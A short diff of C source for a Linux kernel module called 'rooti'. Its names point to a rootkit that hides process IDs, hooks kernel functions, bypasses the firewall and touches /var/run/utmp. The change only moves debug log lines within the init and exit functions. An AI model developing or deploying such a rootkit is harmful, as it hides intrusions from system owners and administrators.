@@ -247,8 +247,6 @@ static int __init rooti_init(void)
     int err;
     struct path path;
 
-    ROOTI_DEBUG("init");
-
     err = kern_path("/var/run/utmp", LOOKUP_FOLLOW, &path);
     if (err) {
         ROOTI_DEBUG("kern_path() failed: %d", err);
@@ -287,19 +285,21 @@ static int __init rooti_init(void)
         return err;
 #endif
 
+    ROOTI_DEBUG("init");
+
     return 0;
 }
 
 static void __exit rooti_exit(void)
 {
-    ROOTI_DEBUG("exit");
-
     rooti_uninstall_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
     rooti_uninstall_fw_bypass_hooks();
 
     // Release any remaining records
     rooti_pid_list_clear(&rooti_hidden_pids);
     rooti_pid_list_clear(&rooti_lifetime_bound_pids);
+
+    ROOTI_DEBUG("exit");
 }
 
 module_init(rooti_init);
